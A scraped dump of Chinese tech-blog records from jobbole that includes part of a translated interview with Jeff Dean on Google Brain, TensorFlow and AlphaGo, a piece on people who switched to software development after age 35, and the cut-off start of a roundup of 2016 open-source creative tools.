团队采用了它，把它作为我们称之为“智能回复”特征的基础，其中输入序列是一封刚收到的邮件，而通过序列是根据刚收到邮件的语境而做出的对回复内容的预测。例如，你也许会收到一封这样的邮件，“嘿，我们想邀请你参加感恩节晚宴。如果能来请回复。”回复通常来说可能是这样。“是的，我们很想去。我们要带些什么？”或者“不好意思，我们去不了，”或者与此语境下相关的类似的回复。它是同一个基本模型，只是用了不同的数据集来训练。</p>\n<p> </p>\n<p>High：潜在的研究应用以及 Google Brain 做出的突破，如何部署在谷歌传统的产品服务中？</p>\n<p>Dean：<b> </b>我们已经开始将这个流程变得规范一点。五年前，当我们最初创建机器学习研究团队去研究海量计算和深度神经网络如何解决问题时，公司里还没有太多人使用这些方法。我们找到了一些感觉领域，在这些领域我们感觉他们是有效地，包括语音识别系统，所以我们与语音识别团队密切协作，将深度神经网络配置为语音识别系统的一部分，并且在识别准确率上取得了实质性进展。然后我们和各种计算机视觉相关团队合作，比如图片搜索和街景服务团队，从而训练模型在给定的各种图片的原始像素下做有趣的事情，比如从图片中提取文本或者理解图片内容是什么（美洲豹、垃圾车等等）。</p>\n<p>有趣的是，随着时间的推移，更多的团队开始采用这些方法，因为他们总会听说另一个团队正在尝试新的东西并取得了好成果。我们会帮助这样这些团队建立联系，或者提供一些关于在特定问题情境中如何使用这些方法的基本建议。我们后来把这个流程做得更规范了一些，所以现在我们有一个专门的团队做外展服务。这是为正在产品中尝试使用这些机器学习模型的团队建立联系的第一点。他们会描述他们的问题，然后外展服务团队会告诉他们：噢，听起来很像另外 XX 团队的问题，这个解决方案很有效果，试试并记得给我们反馈。使用这些方法的团队在数量上有非常大的增长，在 2011 年、2012 年只有几个团队，现在已经发展到 200 多个，并且可能已有几千人在使用我们团队创建的软件训练这种模型。</p>\n<p> </p>\n<p>High：你同时也是 Google 开源机器学习库 TensorFlow 的主要创始人。 和其他几个大公司一样，谷歌专注于开发开源 AI 技术。您对使用开源人工智能技术的理论基础及优势有什么看法？</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1feqx0e0o1rj20hi0bowem.jpg\" width=\"630\" height=\"420\"></p>\n<p>Dean： 现在有许多表达不同机器学习算法的不同框架，并且都还是开源项目 。有更多选择，我认为挺好的，但如果我们可以开发出能获得机器学习社区支持，大家一起来改进的东西，这样也很好。这些框架都在尝试着相似的工作，所以如果我们能将它们放在一起形成一个库供大家采用和使用，这样是很好的。这样做，可以更为简单地表达机器学习想法。传统方式是把探索出来的想法写成论文，做一些实验，而且他们通常不会公开代码，不允许其他人再做这些实验。作为一个研究者，你正在看某人的论文，并尝试将你自己的技术与其对比。通常，因为论文中没有代码，你只能猜测那些代码会是什么。作者并不是有意省去了大量细节。论文作者也许会使用「我们使用了低的学习率」一样的描述，然而你关心的是他们使用了 .0001 的学习率，在一万步后降低到 .0005。建立一个人们可以用代码表达机器学习理念，并把这些研究模型和想法以可执行的方式发布出来的软件架构，使得机器学习理念可以在社区中快速传播。</p>\n<p>对于我们自己而言，它也方便了我们与谷歌外部人员的合作。通常我们暑期会招聘实习生，过去他们大部分已经完成了实习期的项目，但是他们仍在写这方面的论文。然后他们离开了谷歌，再也接触不到谷歌的电脑，所以他们很难继续完成论文最后的工作，运行更多的实验。现在他们使用开源或者 TensorFlow 就可以很快做到，甚至可以找到平台上的人来帮忙。我们正在教谷歌的工程师学习通用机器学习，并把 TensorFlow 作为基本的教学工具。</p>\n<p> </p>\n<p>High：谷歌的优势之一是它拥有大量 AI 和机器学习领域的人才。谷歌研究主管Peter Norvig 估测，全球超过 5% 的机器学习顶尖专家都在谷歌工作。谷歌如何做到对这些天才有这么大的吸引力？鉴于这涉及到多个不同的学科的交叉——计算机科学、工程、神经科学、生物学、数学，你怎么把这些人才安排到最适合他们的位置？</p>\n<p>Dean： 因为我们涉足的领域很多，所以我们需要拥有多种专业知识的人。我发现，当你把具有不同专业知识的人聚在一起去解决问题时，你会发现最终得到结果比那些只具备一种专业知识的一大群人一起做出来的要好。总的来说，你最终做的事情，没有人可以单独做出来。我们的机器学习团队是一个很好的例子。我们有像我一样在建设大规模计算系统方面有很多经验的人，然后我们也有世界级的机器学习研究人员。把这些类型的人结合起来是一个非常强大的团队。机器学习正在接触很多不同的领域。我们正在做的工作涉及医疗、机器人和计算机科学里的一大堆领域，这非常的好。我们团队有数位神经科学专家。</p>\n<p>很快我们将开始一个有趣的实验，它被称为“谷歌大脑培训项目”。这些人在我们的团队工作一年基本上是学习怎么去做机器学习研究。我们有大量的申请者，但是最后这个项目只会留下 28 个人。他们来自不同的背景，处于职业生涯的不同阶段。有的刚刚完成本科学业，有些已经读完博士，有的刚读完博士后，有些已经在不同的领域有过工作经历。他们有不同的学科背景，包括计算机科学、统计学、数学、生物学、物理学，从解决问题的角度来说，我认为这是一个极好的结合。</p>\n<p> </p>\n<p>High：我很好奇，有很多不以技术为中心的传统公司也会使用人工智能和机器学习，你会在多大程度这些传统公司交流与合作？你如何看待采用创新曲线（市场采用新型或创新产品的速度）？显然这涉及了不同公司甚至是不同行业，但也有一些领先的传统行业开始利用人工智能，包括医疗、金融服务公司、有大量非结构化数据需要处理的公司。你是否曾经有机会与传统行业的公司互动或者谈论他们在更加传统的环境中走向人工智能的过程？</p>\n<p>Dean：其他行业的大部分公司在把机器学习应用到业务方面，可能不如谷歌或者其他高科技公司那样深远。我认为随着时间推移，最终大部分公司都会越来越多地应用机器学习，因为机器学习会给他们的业务带来很大的能量和转型。在与一些大的医疗组织建立合作关系上，我们有过多次讨论，看看机器学习可以为这个领域解决什么样的问题。我们最近开发了一个机器学习云产品，可以让人们在谷歌云基础设施上运行机器学习算法。有很多公司对于他们怎么在起业务背景下使用这个产品感兴趣。</p>\n<p>我认为要实现这个转变的途径之一，要经历几个层次。在这些层次中你能使用 AI 技术和机器学习方法来解决问题。在一些领域，了解图像中有什么东西，对很多行业来说是普遍有用的。谷歌和其他公司正在提供使用简便的接口，你不需要知道什么机器学习的知识就可以使用这个接口。你可以只给出一个图像，然后说“跟我说说这个图像”，软件工程即使没有机器学习方面的技能就可以使用，他们得到的信息会像是“照片上是一个体育场，人们在那里打棒球，而且图像中还有一堆文字，文字内容是……”即使没有应用机器学习，这也是非常有用的。</p>\n<p>然后将已开发好的模型用公司的数据再次训练得到一个定制的方案，而不需要做核心机器学习研究去开发一个全新模型。有一个好例子，我们已经应用序列到序列的成果，解决了谷歌六七个不同的难题。另一个好例子，有一个模型可以采集图像然后找出图像中有趣的部分。这个通用模型的一个使用案例是，检测街景图片中的文本信息。你想要能去读取所有的文本，但是首先，你必须能够在店面、路标等上面找到它。这个通用模型同样适用于在医疗设置中，当你诊断糖尿病患者视网膜病变时，你给出一张视网膜的扫描图片，你想要找到这个图片中的病变的指标。这是相同的模型结构，只是换了不同的数据。在这里不是找出街景图片的文本，而是指出视网膜扫描图像中的病变部位。我相信这个通用方法可以很好地解决各类型的难题。</p>\n<p><img class=\"alignnone\" src=\"http://ww1.sinaimg.cn/large/7cc829d3gw1exynncc89vj20lb0goadv.jpg\" width=\"680\" height=\"532\"></p>\n<p> </p>\n<p>High：2016 年 3 月，你在韩国现场目睹了 AlphaGo 的首场胜利。亲眼见证这个成果的感受如何？鉴于人工智能已经更广泛地影响到了我们的日常生活，你如何看待这种世界博览会般的展示，以及人工智能对激发人类想象力和好奇心的广泛影响?</p>\n<p>Dean：我在现场观看了首场比赛，赛程的一半时间我都留在韩国。那种激动的心情真的难以言说。有 3 亿中国人现场观看了首场比赛直播，他们用了 8 个电视频道，每场都有不同的评论员报道这个比赛。韩国也处于同样的兴奋状态。真是很精彩。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1feqvtq8091j20qo0id75k.jpg\" width=\"680\" height=\"468\"></p>\n<p>我认为这种高调的事件，展示了与人工智能相关的各种难题取得了重大意义的进步。我需要指出的是，AlphaGo的大部分工作都是我们伦敦的 DeepMind 团队完成。在项目开始的阶段我们与他们有过一些合作，他们还使用了我们的机器学习软件来训练一些 AlphaGo 模型。他们还使用了张量处理单元（Tensor Processing Unit）——这是一种谷歌设计的定制机器学习硬件芯片，在某种意义上来说这是 AlphaGo 的比赛中的额外的“秘密武器”。人们注意到计算机现在拥有了四五前不曾有的能力，这使我们感到兴奋。在全球范围内，计算机科学系机器学习课程的招生量已经猛增。我认为这个意义重大。受益的不仅仅是计算机科学，还包括公司和业界。有越多聪明的人思考这类问题，我们的社会就会更进步。</p>\n<p> </p>\n<p>High：许多科技界的知名人士比如埃隆·马斯克、比尔·盖茨 和 斯蒂芬·霍金都对人工智能的安全问题发出过警告。你怎么看到这方面的风险？当你对人工智能的思考不断进步成熟时，你如何把这方面的风险也考虑进去？</p>\n<p>Dean：我觉得我并不太赞同你提到的那些人所担忧的末日场景。我觉得那不够贴近现实。我确实认为 AI 会带来社会变革，首先最大的问题就是自动化比较难进行，我们有大量的劳动力会参与到其中。有些事情会被自动化代替，尽管不是完全代替。电脑会以多种方式给予我们帮助，比如阅读医学图像数据，这是一个狭窄但是高技能的领域。我认为电脑不久之后就会相当擅长这方面的工作，更别提自动驾驶了。我不确定政府都在认真思考这些技术的一些影响，以及这对社会总的来说意味着什么。我认为这才是急切需要担忧的。确保决策者仔细考虑这些类型的问题，将是一个非常重要的一步。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/dd708b5011ca615a666a617f958683e8.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/7bd3dbe2e00ad5c5d39167e2fbbc6464.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110925\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110925votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110925\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/4b984c976f6d01d29b5371c01b42b6a1.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            Python，数据挖掘        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/paradise_FD\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/paradise_fd/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 22</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx2.sinaimg.cn/mw690/63918611gy1feqvu2gi3dj21jk111top.jpg"], "fav_nums": 2, "comment_nums": 0, "create_date": "2017/04/26", "praise_nums": 1}
{"tags": " 8 评论 ,职场,培训,程序员", "front_image_path": "full/fadf6ad5780274895faaeba657b5a533580ba011.jpg", "title": "35，40 甚至 50 岁转行做软件开发晚吗？看这 10 个成功故事", "url_object_id": "12b195c05b3a95e332fc6916061782a6", "url": "http://blog.jobbole.com/110962/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q4000052677\">听风</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://belitsoft.com/php-development-services/its-not-too-late-become-software-developer-after-age-35-40-or-50-top-10-true-great-success-stories\">Vladimir Kazankov\r\n</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>常有人说 30 或 35 岁不适合做开发写代码了。那 35 岁以后转行做软件开发还可行么？ 35、40 甚至 50 岁之后才开始学习编程，年龄会不会太大了？让我们来看看 10 个成功转行软件开发的真实故事。</p>\n<p>Aimee Morgan、Clayton Boyle、Wendy Zenone、Bill Barnett、Tyson Daugherty、Sara Powell、Derek Langton、Pavol Almasi、Laurie Alaoui，他们都是年龄较大时才开始学习编程的，他们向我们诠释了“将你喜欢的事情，或者你热衷的事情变成你的职业，任何时候都不会太晚”。</p>\n<p><img src=\"https://belitsoft.com/sites/default/files/assets/top10-software-developers-who-started-after34-40-50.jpg\"></p>\n<h3>35 岁时成为程序员</h3>\n<p><span class=\"imagewrapper\"><img class=\"nopreview aligncenter\" src=\"https://belitsoft.com/sites/default/files/assets/1morgan.jpg\" width=\"111\"></span></p>\n<p>Aimee Morgan 之前是斯坦福大学图书馆档案工作人员，35 岁时报名参加了一门在线课程学习 Python。她发现自己喜欢上编程后，就决定前往 Hackbright 学院进修，Hackbright 是一个专门为女性提供软件开发培训的训练营。 她的编程技能让她获得了 Flixster 后台团队的软件工程师职位（Flixster 是一家为用户提供观影资源和评分功能的美国网络平台社区，该公司后来由华纳兄弟公司拥有），在那里她协助推出了一个新的在线售票平台。 现在她已是 Google（旧金山湾区）的一名网站可靠性工程师。</p>\n<blockquote><p>“不要听信那些传播‘除非在初中就开始编程，否则不值得去学习编程’言论的人。编程技术领域很宽广，能够容纳很多人进入这个领域。年少的时候，要让我承认自己在某些方面存在无知，的确很难。现在年纪大了，反而更容易处理这种最初的挫折感了。”</p></blockquote>\n<h3>36岁时成为程序员</h3>\n<p><span class=\"imagewrapper\"><img class=\"nopreview aligncenter\" src=\"https://belitsoft.com/sites/default/files/assets/2clayton.jpg\" width=\"111\"></span></p>\n<p>Clayton Boyle 曾为一个小的餐饮集团管理餐馆，然后转行从事房地产业务。但是在他脑海里总盘旋着一个想法：学习编程。在他 36 岁的时候，Clayton 在 RefactorU（科罗拉多州布恩市的 10 周编程训练营）报名参加了用于开发软件应用程序（MongoDB、Express.js、Angular 和 Node.js）的 MEAN 技术培训。 现在，Clayton 作为一名初级软件开发工程师，在房地产社交媒体网络 BiggerPockets（科罗拉多州丹佛的房地产投资社区的社交网络）公司任职。</p>\n<blockquote><p>“我曾经尝试过自学一些课程，也买了一些书，但我总是发现，生活是我努力自学路上的阻碍。我对编程的爱好和学习动力已经有很多年了，但我不知道怎么才能成功，直到当我发现编程训练营。我的建议是挑选一个好的编程训练营：对训练营进行调研，了解别人对训练营的评价，与参与培训的人聊天，确保你对训练营有一个良好的印象，并相信你的直觉。在最终决定前，尽可能多的做一些课前工作。”</p></blockquote>\n<h3>38岁时成为程序员</h3>\n<p><span class=\"imagewrapper\"><img class=\"nopreview aligncenter\" src=\"https://belitsoft.com/sites/default/files/assets/3wendy.jpg\" width=\"122\" height=\"79\"></span></p>\n<p>Wendy Zenone ， 38 岁时已身兼妻子和母亲的身份。她的第一份职业是美学家，但她想成为一名软件工程师。 但她实现这个梦想工作的道路并不简单。 她的经历表明，从一份成功事业转行投身到技术行业中是一个艰巨的任务，需要汗水、决心和胆量。 虽然有人说机会只给年轻人，但她仍参加了 Hackbright。 现在，她是旧金山的贷款俱乐部（一种类似 EBay 的贷款网站）的助理应用安全工程师。</p>\n<blockquote><p>“作为一个三十多岁的中年妈妈，我不像二十多岁的年轻人那样拥有很多的空闲时间。我开始寻找一些实习工作，发现一家公关公司在招实习生。在那里我工作了几个月，之后接到 Facebook 的来电。他们向我提供了广告部门的职位。我咨询 Facebook 的一些工程师，了解如何学习编写代码，以及如何做这项工作。其中一个工程师说：‘这需要很多的练习’，并向我展示了他是如何修复代码中的错误。并不是每个人都鼓励或乐于助人的。我考察并参与了 Hackbright 的面试，一个专为女性提供编程培训的训练营。但收到了一封面试不通过的邮件，并建议我 6 个月后再面试。我的第二次面试好多了，我被接受了！毕业后，我经历了很多面试。我通过了多个软件工程师岗位的面试。”</p></blockquote>\n<h3>40岁时成为程序员</h3>\n<p><span class=\"imagewrapper\"><img class=\"nopreview aligncenter\" src=\"https://belitsoft.com/sites/default/files/assets/8barnett.jpg\" width=\"96\" height=\"96\"></span></p>\n<p>Bill Barnett 40岁时在俄亥俄州的辛辛那提大学进修学习计算机科学。在做飞机机械师 17 年后， Barnett 转行做软件开发，却并不感到难过。 Barnett 现在是位于辛辛那提的 27 人软件开发公司 Gaslight 的联合创始人。 他用 Ruby on Rails 做服务器端开发。</p>\n<blockquote><p>“当我意识到自己就是那个阻碍自己前进的人，就决定重回学校学习。没有什么好的学习方法。只有一种理论方法，就是努力学习，坚持不懈。不要害怕提出问题，<em> 参与开发人员社区，访问用户群，与人讨论。尤其是作为一名大龄软件开发人员，不要害怕接触那些开发经验更丰富，但年龄反而更小的开发人员。不要‘有我年长，我见识多’的思维观念。”</em></p></blockquote>\n<p><span class=\"imagewrapper\"><img class=\"nopreview aligncenter\" src=\"https://belitsoft.com/sites/default/files/assets/9pavol.jpg\" width=\"111\"></span></p>\n<p>Pavol Almasi 于 1999 年获得工商管理学士学位。此后，他主要的职业是一名印前专家。 他希望学习计算机编程，但却没有想过去学校学习，也没想过发展成职业，因为他认为编程是天才做的事情。 2013 年 40 岁时，Pavol 获得 McCann 的商业与技术学院计算机程序学士学位（课程包括学习 C ++ 编程，Visual Basic Programming，Java 等）。 几个月来，他比那里的其他年轻学生进步得更多，正如 Pavol 说的，他们可能没有他的全力以赴的精神和积极动力。 现在他是 Berkshire Hathaway GUARD 保险公司（Wilkes-Barre，宾夕法尼亚州）的一名计算机程序员。</p>\n<blockquote><p>“看书，阅读教程，最重要的是疯狂地练习。完成教科书中的每一个练习，深入研究课本的内容，并对同一件事情思考不同的解决方案。于 2014 年 12 月以第一名的成绩从学校毕业（副学士学位）。之后，发出了大量的简历，也经历了几次面试，但时运不济。我不得不做一份与编程无关的工作。两个星期之前，我接到了之前申请的职位（C＃软件开发人员，大部分是网站服务和数据库相关的开发）的面试电话。我通过了这次电话面试。上周我通过了个人面试（代码审查，编程讨论）。今天，我参加了这家公司的第三次面，以及最终的面试（个性测试，一些难题）。最后，我获得了这份工作。”</p></blockquote>\n<h3>42岁时成为程序员</h3>\n<p><span class=\"imagewrapper\"><img class=\"nopreview aligncenter\" src=\"https://belitsoft.com/sites/default/files/assets/4derek.jpg\" width=\"98\" height=\"98\"></span></p>\n<p>Derek Langton 之前是马萨诸塞州的州警，在服役近二十年之后决定转行做 iOS 程序员。 42 岁的兰顿开始观看麻省理工学院和斯坦福大学的计算机科学课程视频，然后转而观看 YouTube 上的视频教程。Langton 说“吃、喝、睡觉，以及 iOS 开发。 你要么做，要么不做。 你不可能只做一半。”现在，Derek 是一名个体经营的 iOS 外包开发商和 FFL Startup Accelerator（旧金山湾区）的总监。</p>\n<blockquote><p>“我做了一个免费的购物伴侣 iOS 应用：Smoopa。我的 APP 被苹果推荐过，并在《今日美国》，《消费者报告》，《时代》，《CNET》，《TechCrunch》和《华尔街日报》上报导过。“</p></blockquote>\n<h3>40岁后成为程序员</h3>\n<p><span class=\"imagewrapper\"><img class=\"nopreview aligncenter\" src=\"https://belitsoft.com/sites/default/files/assets/5patricia.jpg\" width=\"111\"></span></p>\n<p>Patricia Ehrhardt 的 20 多年职业生涯跨越了各种行业领域，包括针灸、非营利组织和工商管理。 Patricia 想了解如何编写代码，并可能转行为计算机编程，并遇到了 Coursera。 令人惊讶的是，这些课程是免费的，她立即参加了「Programming for Everybody (Python)」。 凭借在 Coursera 的几个月培训，她获得了一份 Web 开发者的工作。 之后参加了“女性编程奖学金“计划。 Patricia 在完成该项目计划时有两名导师协助：他们分别做后端 Web 开发和前端开发。 多亏了这个项目， Patricia 获得了在旧金山 ePublishing 的全职工作。</p>\n<blockquote><p>“投资自己。我每个小时都能学到新的东西，这不是开玩笑。我每天最期待的是学习和成为一个更好的工程师。我有一个长期目标，即开发一个软件去帮助一些组织，例如昭雪计划、失踪以及被剥削的儿童或无家可归者的协会、减贫和为受虐妇女辩护等组织。”</p></blockquote>\n<p><span class=\"imagewrapper\"><img class=\"nopreview aligncenter\" src=\"https://belitsoft.com/sites/default/files/assets/6sara.jpg\" width=\"111\"></span></p>\n<p>Sara Powell 于 1999 年获得了她的第一个文学学士学位。之后，她作为一名自由音乐家参与了许多不同行业领域的活动，包括医疗行业等等。 之后，Sara Powell 加入了 Free Code Camp（一个致力于帮助人们学习如何编写代码，为非营利组织开发项目，并获得开发人员工作的开源社区）。 现在她是 Health Carousel（位于辛辛那提，俄亥俄州）的一名软件开发人员。 她写道：“我对目前的职位很满意，并不打算离开这个行业”。Python、Django 和 JavaScript 是 Sara 擅长的几个技能。</p>\n<blockquote><p>“我从一个完全不会编程的小白，成长为编程能力强，能为前端开发岗位进行面试的人。”</p></blockquote>\n<p><span class=\"imagewrapper\"><img class=\"nopreview aligncenter\" src=\"https://belitsoft.com/sites/default/files/assets/7tyson.jpg\" width=\"111\"></span></p>\n<p>Tyson Daugherty 于 1992 年完成大学学业，获得美术学士学位。</p>\n<p>在他所有的职业角色中，他曾经深入参与了产品的研发，但从来没有写过一行代码。 他明白，要成为一个更成功的，创新和敏捷的企业家，他需要对技术的更深入的了解，以及自己构建原型的技能。 2013 年，他加入了 Hack Reactor Courses（位于旧金山的一个为期 12 周的编程学校）。 之后，他很快地成为了耐克公司的一名高级网络工程师。 现在，他是 GE 数字公司的一名高级软件工程师，该公司总部位于圣拉蒙（有 10,000 多名软件工程师在该软件开发公司工作）。</p>\n<blockquote><p>“就像被卷入了一场信息海啸中！我们从上午 9 点开始，首先会有一个很轻松的讲座，然后你可以选择留下来听讲座的第二部分，或者开始编程挑战。在这里有很多引导式的自我学习方法，这些方法在训练我们寻找我们自己的或工作中的问题的解决方法都非常有效。当我不用参加每日站立会议或敏捷迭代计划会议的时候，我就写代码 – 每时每刻所有的事情都只是编程，这感觉非常棒。我知道我喜欢编程实现我的产品想法。幸运的是，我也喜欢实现别人的产品！”</p></blockquote>\n<h3>50岁后成为程序员</h3>\n<p><span class=\"imagewrapper\"><img class=\"nopreview aligncenter\" src=\"https://belitsoft.com/sites/default/files/assets/10lauri.jpg\" width=\"111\"></span></p>\n<p>Laurie Alaoui 在 57 岁时成为了 General Assembly（一个为期 12 周的沉浸式的全栈 Web 开发新手训练营）学校的一名学生。 对于 Alaoui 来说，在她看到一个有关增强现实和手势技术的被称为第六感计算装置（SixthSense）的 TED 演讲后，学习编程就成为了她的一个梦想。 现在 Laurie 是一家小型公司 TruckBuds（位于加利福尼亚州达利市）的一个全栈 Ruby on Rails 开发者。 在进入这个具有挑战性的职业之前，Laurie 曾担任编辑、销售/客户主管，甚至有过有机农场主的工作经验。</p>\n<blockquote><p>“在我参加的第一次聚会上，我只理解某个家伙口中的所有单词中的百分之二的意思。编程非常强大，它能带给你为社会做更多贡献的机会。你还可以通过编程改变人们的生活方式。过去我只是坐在家里玩数独游戏，但编程比这有趣得多。“</p></blockquote>\n<h3>总结</h3>\n<p>希望大家从这些故事中得到了启发：<strong>对于你真正喜欢的，有热情的事情来说，什么时候都不晚。</strong></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110962\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110962votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110962\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 8 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 8 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">听风</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/9538B04AD8C6883F49C38BC8ECDDAF3C/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q4000052677\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q4000052677/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 19</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/04/05d0b09238a3d6b727a1cc792a123194.jpg"], "fav_nums": 8, "comment_nums": 8, "create_date": "2017/04/23", "praise_nums": 4}
{"tags": "开源,工具与资源,工具", "front_image_path": "full/b8b62a5b843645794f8cc7fca80c08394ee5deb1.jpg", "title": "2016 年度顶级开源创作工具", "url_object_id": "1163b155a6bc3f142cad255226a9139d", "url": "http://blog.jobbole.com/111012/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/16/12/yearbook-top-open-source-creative-tools-2016\">opensource</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-8439-1.html\">Linux中国</a>   </div><div>\n<blockquote><p>无论你是想修改图片、编译音频，还是制作动画，这里的自由而开源的工具都能帮你做到。</p></blockquote>\n<p>几年前，我在 Red Hat 总结会上做了一个简单的演讲，给与会者展示了 <a href=\"https://opensource.com/life/12/9/tour-through-open-source-creative-tools\">2012 年度开源创作工具</a>。开源软件在过去几年里发展迅速，现在我们来看看 2016 年的相关领域的软件。</p>\n<h3 id=\"toc_1\">核心应用</h3>\n<p>这六款应用是开源的设计软件中的最强王者。它们做的很棒，拥有完善的功能特征集、稳定发行版以及活跃的开发者社区，是很成熟的项目。这六款应用都是跨平台的，每一个都能在 Linux、OS X 和 Windows 上使用，不过大多数情况下 Linux 版本一般都是最先更新的。这些应用广为人知，我已经把最新特性的重要部分写进来了，如果你不是非常了解它们的开发情况，你有可能会忽视这些特性。</p>\n<p>如果你想要对这些软件做更深层次的了解，或许你可以帮助测试这四个软件 —— GIMP、Inkscape、Scribus，以及 MyPaint 的最新版本，在 Linux 机器上你可以用 <a href=\"https://opensource.com/business/16/8/flatpak\">Flatpak</a> 软件轻松地安装它们。这些应用的每日构建版本可以<a href=\"http://flatpak.org/apps.html\">按照指令</a> 通过 Flatpak 的“每日构建的绘图应用（Nightly Graphics Apps）”得到。有一件事要注意：如果你要给每个应用的 Flatpak 版本安装笔刷或者其它扩展，用于移除这些扩展的目录将会位于相应应用的目录 <strong>~/.var/app</strong> 下。</p>\n<h3 id=\"toc_2\">GIMP</h3>\n<p><a href=\"https://opensource.com/tags/gimp\">GIMP</a> <a 